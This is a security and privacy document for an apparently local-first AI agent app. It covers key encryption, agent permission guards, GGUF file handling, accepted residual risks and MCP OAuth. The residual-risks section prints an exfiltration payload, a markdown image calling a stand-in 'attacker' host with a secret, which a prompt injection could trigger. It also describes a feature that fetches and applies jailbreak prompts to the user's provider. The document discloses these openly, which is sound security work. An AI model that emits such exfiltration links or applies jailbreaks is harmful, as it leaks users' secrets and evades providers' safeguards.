# Security & Privacy

Nocturn is built local-first: no accounts, no telemetry, no backend of its own.
This document describes what the app stores, what leaves the machine, and how
secrets are protected.

## What leaves your computer

- **Prompts and tool results** are sent only to the API provider *you*
  configured (your key, your Base URL) — the same traffic as any OpenAI-compatible
  chat client. Nocturn adds no middleman.
- **Browser Use** drives a local headless Chromium via CDP. Pages the agent
  visits are fetched by your machine, from your network.
- Nothing else is transmitted. There is no analytics, crash reporting, or update
  phone-home.

## What is stored locally

- `%APPDATA%/com.haloui.app` (Windows) — settings, sessions, projects, notes,
  automation schedules, usage stats, browser-view state.
- API keys are stored in plain settings.json **unless** key encryption is
  enabled (recommended): then keys are AES-256-GCM encrypted (RustCrypto
  `aes-gcm`, standard `nonce ‖ ciphertext ‖ tag` layout), and the vault key is
  derived from your master password with **Argon2id** (OWASP parameters,
  19 MiB / t=2). Vaults created on the legacy PBKDF2 KDF are upgraded to
  Argon2id transparently on the next successful unlock — all encrypted fields
  are re-keyed in place.
- Project checkpoints are plain-text snapshots under
  `appdata/checkpoints/` — they contain your code; disk encryption is your friend.

## Agent tool surface

The agent can (depending on permission mode): read/write/delete files under the
paths it is given, run shell commands, use MCP servers, and drive a local
browser. Guards:

- permission modes (Plan / Ask / Edit / Full) gate mutating tools;
- per-task allowlists remember approved commands;
- hooks (PreToolUse) can block any call;
- Hard Limits abort a run when token/$ budgets are exceeded.

Review what you approve — "Always for this task" persists the decision in the
session store.

## GGUF Lab (local model surgery)

The GGUF Lab panel and the `gguf_inspect` / `gguf_cut` / `gguf_test` agent
tools operate on GGUF files inside a dedicated lab storage
(`appdata/gguf/`). Boundaries:

- **GGUF is a data container.** Model files are parsed as a strict
  little-endian binary format (header, metadata key-values, tensor table,
  tensor bytes) and are never executed, dequantized, or interpreted as code.
  Parsing enforces the same validations as llama.cpp's loader (magic, offset
  contiguity, alignment, name/size limits) and caps declared lengths before
  allocating, so hostile files cannot cause runaway allocations.
- **No arbitrary paths from the frontend.** Lab commands accept only plain
  file *names* inside `appdata/gguf` (a validator rejects path separators,
  `..` and non-`.gguf` names). Surgery always writes a new file
  (`temp + fsync + rename`); the source is never modified in place.
- **Network sources, all explicit.** Pulling models talks to *your* local
  Ollama server (`127.0.0.1:11434`) — the same traffic as running
  `ollama pull` yourself. Downloading the optional `llama-server` binary
  hits `api.github.com` / GitHub release assets once per button press
  (CPU build, ~18.5 MB); there is no background fetching.
- **llama-server is a local process** resolved from your PATH, a path you
  set, or the downloaded release; it binds `127.0.0.1` by default and is
  killed with its whole process tree when you stop the test or on failure.
  Its stdout/stderr go to a log file inside `appdata/gguf/logs/`.
- **Blob integrity.** Exported Ollama blobs and their sha256 are verified
  by content hash after copying; surgery outputs are re-parsed and their
  surviving tensor bytes are compared byte-for-byte against the source
  before the result is renamed into place.
- **Agent tools.** `gguf_cut` and `gguf_test` are classified mutating in
  `perm.rs` and its frontend mirror (`toolFilter.ts`) — they ask for
  confirmation in Ask mode and are blocked in Plan mode, like `shell_run`.
  `gguf_inspect` is read-only. Importing a model into Ollama (`/api/create`)
  is UI-gated behind the same operation guard as the panel actions.

## Known residual risks (design trade-offs)

- **Symlink TOCTOU on path writes — closed (2026-10-04).** File writes used
  to validate the path (canonicalize + sensitive-path check) and then write
  through the normal filesystem, so a local process racing the agent could
  swap a path component for a symlink between check and write. Agent-facing
  writes (`fs_write`) now follow an "open → verify → write" scheme: the file
  is opened refusing to follow the final symlink component (`O_NOFOLLOW` on
  Unix; `FILE_FLAG_OPEN_REPARSE_POINT` + reparse-attribute refusal on
  Windows), the final path is read back **from the opened handle**
  (`/proc/self/fd`, `F_GETPATH`, `GetFinalPathNameByHandle`) and the
  sensitive-path and project-roots gates are re-run against that verified
  location before anything is written through the handle. A component
  swapped between the permission check and the open changes the handle's
  final path and is refused; a swap after the open cannot move the handle's
  target. Residual: the `O_CREAT` side effect can leave an empty file at a
  swapped location before the refusal (same-user litter, no data written),
  and tool **reads** (`fs_read`, `fs_grep`) still follow symlinks — a racing
  local process could point a read at another file; the content goes to the
  user's own configured provider and is visible in the tool card. Accepted
  (single-user machine; reads are a much weaker target than writes).
- **Broad import reads.** Settings import, plugin import, provider-config
  import (Codex-style `config.toml`) and knowledge-base indexing can read
  arbitrary user-chosen files (system locations are rejected). This is the
  feature; the webview process is the trust boundary. The provider-config
  parser copies only endpoints/wire/model into a profile — token
  environment references (`$VAR`, `env:VAR`) are imported empty, so no
  third-party secret material lands on disk; the API key is pasted by you.
- **Executable configs.** `hooks.json` / `mcp.json` define commands that the
  app will execute. They are only written through an explicit confirmation
  flow (`allowExecutableConfigs`) — treat any file claiming to be a Nocturn
  config as untrusted input.
- **Remote images in model output.** The CSP allows `img-src https:` so
  markdown images returned by providers render inline. A prompt injection
  (e.g. in a page the agent reads via Browser Use) could abuse this as a
  passive exfiltration channel: `![](https://attacker/?d=<secret>)` sends one
  GET outside the `connect-src` fence. This is an accepted trade-off —
  rendering provider images is a deliberate feature; if you do not need
  remote images, remove `https:` from `img-src` in `src-tauri/tauri.conf.json`.
- **Lyrics lookups (opt-in, off by default).** The media mini-bar can fetch
  synced lyrics from lrclib.net — a free, keyless API. When enabled, it
  sends the track title and artist name (nothing else). Playback state and
  control never leave the machine: they go through the OS media controls
  (SMTC on Windows), with no Spotify account or network involved.
- **YouTube player (opt-in, radio with the Spotify integration).** Uses
  only the official embed (`www.youtube.com`, with
  `www.youtube-nocookie.com` as a fallback host) — the sanctioned embedding
  path, no keys, no OAuth, no stream extraction or ad bypass. The CSP
  widens `frame-src` to those hosts only (static in tauri.conf.json; the
  app never renders third-party iframes from chat content — raw HTML in
  markdown is disabled, so the widened frame-src is exercised exclusively
  by the player). The embed URL carries `origin`/`widget_referrer` = the
  app's own origin — desktop WebViews do not send a Referer header for
  iframes, and without it YouTube rejects playback (error 150/153).
  Video thumbnails are fetched from `i.ytimg.com` (covered by the existing
  `img-src https:`). You paste links yourself; the queue and volume live
  in localStorage. Playback of the collapsed window continues by design
  (the iframe stays mounted).
- **Telegram notifications (opt-in, off by default).** You create your own
  bot via @BotFather and paste the token; it is stored encrypted
  (`enc:v1:…`) and excluded from settings export. The bot talks ONLY to
  the chat bound by the first `/start` — messages from any other chat are
  ignored silently, and a second chat can never take over the binding.
  Outbound traffic is limited to short text messages to `api.telegram.org`
  for the events you enabled (task start / finish / error / confirmation
  request); incoming messages are used for binding only in this phase.
  With the toggle off the module makes zero network requests.
- **Jailbreak live search (opt-in, explicit click only).** The library can
  fetch files from a small, curated whitelist of public GitHub repositories
  when the user presses "Search sources" — nothing is contacted otherwise
  and there are no background updates. The user's search query **never
  leaves the machine**: repository files are downloaded in full (public
  http/https only, the same SSRF filter that guards Browser Use, 32 MB
  body cap), then parsed and filtered locally. Imported entries are inert
  user content: they go nowhere except to the provider you configured, as
  part of your own prompt. Applying a jailbreak shows a standing risk
  warning (provider ToS / account bans) unless the user opted out of it.

## Reporting

Please open a GitHub issue for anything security-related you find. For
sensitive reports, contact the maintainers privately first.

## MCP OAuth (волна F5)

Удалённые MCP-серверы с `auth: "oauth"` проходят браузерную авторизацию
(Authorization Code + PKCE, RFC 7636/8414/7591-DCR). Гарантии:

- **Никаких фоновых запросов**: discovery/авторизация — только по кнопке
  «Authorize»; refresh — только по 401 в активном вызове (single-flight:
  ровно один запрос к провайдеру при N параллельных 401); автоконнект
  oauth-серверов при старте отключён.
- **Loopback-listener**: только 127.0.0.1, эфемерный порт, параметр state
  (CSRF), жёсткий дедлайн 180 секунд.
- **Хранение токенов**: зашифрованный mcp-oauth.json (AES-256-GCM тем же
  стеком, что настройки). Vault заперт / ключа нет → токены живут только
  в памяти процесса (Authorize помечает «session-only»).
- **Отзыв**: кнопка Revoke — RFC 7009 revocation (best-effort) + локальная
  очистка токенов.
- Риски на стороне пользователя: провайдер авторизации видит попытку
  входа; Nocturn никаких сервисов не рекомендует и не выбирает.
